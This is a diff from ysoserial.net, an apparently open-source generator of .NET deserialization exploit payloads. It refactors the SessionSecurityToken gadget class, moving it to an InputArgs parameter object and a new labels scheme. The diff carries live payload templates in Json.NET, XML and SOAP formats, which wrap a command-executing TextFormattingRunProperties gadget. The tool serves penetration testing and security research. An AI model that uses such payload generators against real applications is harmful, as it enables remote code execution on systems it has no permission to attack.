@@ -30,14 +30,14 @@ namespace ysoserial.Generators
             return "SessionSecurityToken";
         }
 
-        public override string Credit()
+        public override string Finders()
         {
             return "Soroush Dalili, @mufinnnnnnn";
         }
 
-        public override bool isDerived()
+        public override List<string> Labels()
         {
-            return true;
+            return new List<string> { GadgetTypes.BridgeAndDerived };
         }
 
         [Serializable]
@@ -125,10 +125,10 @@ namespace ysoserial.Generators
             return b64SessionTokenMatch.Groups[1].Value;
         }
 
-        public override object Generate(string cmd, string formatter, Boolean test, Boolean minify, Boolean useSimpleType)
+        public override object Generate(string formatter, InputArgs inputArgs)
         {
             Generator generator = new TextFormattingRunPropertiesGenerator();
-            byte[] binaryFormatterPayload = (byte[])generator.Generate(cmd, "BinaryFormatter", false, minify, useSimpleType);
+            byte[] binaryFormatterPayload = (byte[])generator.GenerateWithNoTest("BinaryFormatter", inputArgs);
             string b64encoded = Convert.ToBase64String(binaryFormatterPayload);
 
             if (formatter.Equals("binaryformatter", StringComparison.OrdinalIgnoreCase)
@@ -136,20 +136,20 @@ namespace ysoserial.Generators
                 || formatter.Equals("objectstateformatter", StringComparison.OrdinalIgnoreCase))
             {
                 var obj = new SessionSecurityTokenMarshal(b64encoded);
-                return Serialize(obj, formatter, test, minify, useSimpleType);
+                return Serialize(obj, formatter, inputArgs);
             }
             else if (formatter.ToLower().Equals("json.net"))
             {
 
                 string payload = "{'$type': 'System.IdentityModel.Tokens.SessionSecurityToken, System.IdentityModel, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089', 'SessionToken':{'$type':'System.Byte[], mscorlib','$value':'" + GetB64SessionToken(b64encoded) + "'}}";
 
-                if (minify)
+                if (inputArgs.Minify)
                 {
                     payload = JSONMinifier.Minify(payload, new string[] { "System.IdentityModel" }, null);
                 }
 
 
-                if (test)
+                if (inputArgs.Test)
                 {
                     try
                     {
@@ -168,12 +168,12 @@ namespace ysoserial.Generators
   <SessionToken i:type=""x:base64Binary"" xmlns="""">{GetB64SessionToken(b64encoded)}</SessionToken>
 </SessionSecurityToken></root>";
 
-                if (minify)
+                if (inputArgs.Minify)
                 {
                     payload = XMLMinifier.Minify(payload, null, null);
                 }
 
-                if (test)
+                if (inputArgs.Test)
                 {
                     try
                     {
@@ -192,12 +192,12 @@ namespace ysoserial.Generators
   <SessionToken z:Type=""System.Byte[]"" z:Assembly=""0"" xmlns="""">{GetB64SessionToken(b64encoded)}</SessionToken>
 </w></root>";
 
-                if (minify)
+                if (inputArgs.Minify)
                 {
                     payload = XMLMinifier.Minify(payload, null, null);
                 }
 
-                if (test)
+                if (inputArgs.Test)
                 {
                     try
                     {
@@ -222,12 +222,12 @@ namespace ysoserial.Generators
 </SOAP-ENV:Envelope>
 ";
 
-                if (minify)
+                if (inputArgs.Minify)
                 {
                     payload = XMLMinifier.Minify(payload, null, null, FormatterType.SoapFormatter);
                 }
 
-                if (test)
+                if (inputArgs.Test)
                 {
                     try
                     {
